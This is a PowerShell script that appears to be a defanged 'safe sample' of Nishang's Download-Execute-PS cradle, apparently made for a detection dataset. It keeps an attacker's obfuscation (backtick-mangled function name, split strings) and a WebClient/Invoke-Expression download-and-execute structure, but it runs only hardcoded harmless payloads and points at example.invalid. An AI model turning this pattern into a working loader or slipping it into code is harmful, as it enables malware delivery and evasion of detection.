Function D`O`WNlOAd-`eX`Ec`UTE-`Ps {
    [CmdletBinding()]
    Param(
        [Parameter(mandatory = $True )]
        [String]$ScriptURL , 

        [String]$Arguments , 

        [switch]$NoDownload 
    )

    $artifactDir = Join-Path $PSScriptRoot "artifacts\delivery"
    If ( -Not (Test-Path $artifactDir )) {
        $Null = New-Item -ItemType ('Dir' + 'e' + 'ctory') -Path $artifactDir -Force
    }

    $client = New-Object ('N' + 'e' + 't.Web' + 'C' + 'lient')
    $client."HeAdErS"["User-Agent"] = "Dataset-Nishang-SafeSample"

    If ($NoDownload ) {
        Write-Output "[safe] Simulating in-memory download from $ScriptURL"

        $downloadedScript = 'function Invoke-FakePayload {
    param([string]$Message = "hello")

    Write-Output "[safe] In-memory payload executed."
    Write-Output "[safe] Payload message: $Message"
}'

        Invoke-Expression $downloadedScript 

        If ($Arguments ) {
            Write-Output "[safe] Executing downloaded arguments in memory."
            Invoke-Expression $Arguments 
        }
    }
    Else {
        $filePath = Join-Path $artifactDir "downloaded-safe-payload.ps1"

        $payloadFile = 'param([string]$Message = "hello")

Write-Output "[safe] Disk payload executed."
Write-Output "[safe] Payload message: $Message"'

        Set-Content -Path $filePath -Value $payloadFile -Encoding ('UT' + 'F8')
        Write-Output "[safe] Simulating download to $filePath from $ScriptURL"

        If ($Arguments ) {
            & $filePath $Arguments 
        }
        Else {
            & $filePath 
        }
    }
}

download-execute-ps `
     -scripturl "https://example.invalid/payload.ps1" `
     -arguments "Invoke-FakePayload -Message 'hello'" `
     -nodownload
